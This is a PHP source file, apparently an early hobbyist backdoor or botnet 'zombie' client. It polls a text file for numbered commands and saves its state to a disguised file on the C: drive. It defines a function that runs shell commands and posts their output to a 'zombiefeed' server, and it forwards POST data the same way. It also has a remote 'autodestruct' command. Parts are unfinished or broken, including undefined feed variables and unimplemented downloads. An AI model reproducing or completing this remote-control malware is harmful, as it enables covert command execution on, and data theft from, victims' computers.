<?php
//////////////////////////////////////////////////////////////////
//©opylefted by <-Harvie 2oo7
////////////////////////SETTINGS//////////////////////////////////

$file = "backdoor.txt"; //Interface to comunicate with BackD00R
$lastf = "c:\\sysc.sys"; //Place to save last settings
$feed = "http://localhost:8080/PHP/zombiefeed.php?feed=";

//Init (will be used, if no settings was saved):
$last = 0;
$interval = 30;
//////////////////////////////////////////////////////////////////

function post($host, $path, $data) {
  $http_response = "";
  $content_length = strlen($data);
  $fp = fsockopen($host, 8080);
  fputs($fp, "POST $path HTTP/1.1\r\n");
  fputs($fp, "Host: $host\r\n");
  fputs($fp, "Content-Type: application/x-www-form-urlencoded\r\n");
  fputs($fp, "Content-Length: $content_length\r\n");
  fputs($fp, "Connection: close\r\n\r\n");
  fputs($fp, $data);
  while (!feof($fp)) $http_response .= fgets($fp, 28);
  fclose($fp);
  echo("Posted\n");
  return $http_response;
}

$postdata = "?feed=bar";
foreach($_POST as $key => $val) $postdata .= '&'.$key.'='.$val;

$http_response = post('localhost', '/PHP/zombiefeed.php', $postdata);

/////////////////////////////////////////////////////

function shellf($command) {
  $shellout = shell_exec($command);
  post($feedhost, $feedpath, $shellout);
  echo ($shellout); //Debug
  }

function autodestruct() {
  echo("KILLED BY MY MASTER !!!\n\n");
  //System("del this1234567889.exe");
  //System("shutdown -s");
}

//////////////////////////////////////////////////////////////////

//Debug:
//readfile("http://harvie.stokoruna.cz/");
//shellf("dir");

//GET SAVED SETTINGS:
if ( $fp = fopen($lastf, "r") ) { //Check if settings file exists
    $temp = fgets($fp);
    fclose($fp); //Close settings file
    //Parse saved settings:
    $temp = explode( " ", trim($temp) );
    $last = $temp[0];
    $interval = $temp[1];
    //echo($fp); //Debug
  }
  
/*
echo("last: $last\n"); //Debug
echo("interval: $interval\n"); //Debug
*/

while(1) { //Listen on interface
  $in = file($file); //Read commands from interface
  if( $last < trim($in[0]) ) { //Command number check
  
    //Parse commands from interface to variables:
    $last = trim($in[0]);
    $interval = trim($in[1]);
    $command = trim($in[2]);
    $download = trim($in[3]);
    $downloadto = trim($in[4]);
    
    //Save settings:
    $fp = fopen($lastf, "w+");
    fwrite($fp, ("$last $interval") );
    fclose($fp);

///////WORK WITH RECIEVED COMMANDS////////////////////////////////

    if ($command == "_autodestruct")
     { autodestruct(); }

    echo("last: $last\n");
    echo("interval: $interval\n");
    echo("command: $command\n");
    echo("Download what: $download\n");
    echo("Download where: $downloadto\n");

    echo("-------------------------------------------------------------------------\n");
    
///////REPLY TO SERVER////////////////////////////////////////////
    
    //readfile($reply);
    
//////////////////////////////////////////////////////////////////
    
  }
  sleep($interval); //Pause
}

?>
